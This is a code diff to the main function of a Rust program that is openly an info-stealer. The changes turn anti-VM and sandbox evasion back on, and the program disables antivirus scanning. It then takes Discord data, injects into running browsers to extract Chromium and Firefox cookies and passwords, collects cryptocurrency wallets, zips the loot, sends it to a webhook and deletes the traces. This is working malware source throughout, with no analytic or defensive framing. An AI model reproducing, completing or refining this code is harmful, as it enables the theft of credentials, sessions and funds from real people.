@@ -112,9 +112,15 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
     // This silences telemetry and disables in-process AV scanning.
     core::bypass::apply_all();
 
-    // Anti-VM/sandbox checks disabled for testing (detection + sandbox both no-op).
-    // Re-enable core::detection::verify_environment() and core::sandbox::verify_environment()
-    // before production use.
+    // ── 1. Anti-VM pre-flight ──────────────────────────────────────────────
+    if !core::detection::verify_environment() {
+        return Ok(());
+    }
+    thread::sleep(Duration::from_millis(100));
+    if !core::detection::verify_environment() {
+        return Ok(());
+    }
+    core::sandbox::verify_environment();
 
     let _stealth_applied = false;
 
@@ -142,30 +148,33 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
         .build()
         .unwrap_or_else(|_| reqwest::Client::new());
 
-    let client_discord = client.clone();
-    let discord_task = tokio::spawn(async move {
-        crate::discord::get_discord_data(&client_discord).await
-    });
-    let browsers_task = tokio::task::spawn_blocking(browsers::run);
-
+    // ── 2. Discord ───────────────────────────────────────────────────────────
     let (_discord_accounts, discord_content, embeds) =
-        discord_task.await.unwrap_or((Vec::new(), String::new(), Vec::new()));
+        crate::discord::get_discord_data(&client).await;
 
-    // Discord embeds go out immediately — don't wait for zip/gofile.
-    if !embeds.is_empty() {
-        crate::sender::send_embeds_only(&client, &wbh, &embeds).await;
-    }
-
-    let mut all_files = browsers_task.await.unwrap_or_default();
-
+    // ── 3. Kill browsers already running ───────────────────────────────────────
     core::kill::kill_browsers();
 
-    // Browsers are closed — inject (if needed) + retry cookies/passwords with unlocked DBs.
-    let post_kill = browsers::chromium::extract_cookies_post_kill();
-    browsers::merge_files(&mut all_files, post_kill);
+    // ── 4. Chromium inject (keys only, may spawn headless) ───────────────────
+    let pids_before_inject = core::kill::snapshot_browser_pids();
+    browsers::chromium::inject_and_cache_all();
+
+    // ── 5. Gecko extraction ────────────────────────────────────────────────────
+    let mut all_files = gecko::extract_all();
+
+    // ── 6. Cleanup headless browsers spawned for inject ───────────────────────
+    core::kill::kill_new_browsers(&pids_before_inject);
+    browsers::common::ci::cleanup_legacy_artifacts();
+    core::kill::kill_browsers();
+
+    // ── 7. Cookie / profile recovery (DBs unlocked) ───────────────────────────
+    let chromium_files = browsers::chromium::extract_all_from_cache();
+    all_files.extend(chromium_files);
     let gecko_cookie_retry = browsers::gecko::extract_cookies_post_kill();
     browsers::merge_files(&mut all_files, gecko_cookie_retry);
+    browsers::common::zipp::sort_entries(&mut all_files);
 
+    // ── 8. Wallets, telegram, zip, send ───────────────────────────────────────
     let wallet_files = wallet::collect_wallets();
     for (name, content) in wallet_files {
         all_files.push((name, String::from_utf8_lossy(&content).into_owned()));
@@ -206,7 +215,7 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
 
     let _ = fs::remove_file(&zip_path);
 
-    let _statuses = crate::sender::send_to_webhook(&client, &wbh, Vec::new(), zip_data, zip_name).await;
+    let _statuses = crate::sender::send_to_webhook(&client, &wbh, embeds, zip_data, zip_name).await;
 
     let _ = fs::remove_file(&zip_path);
 
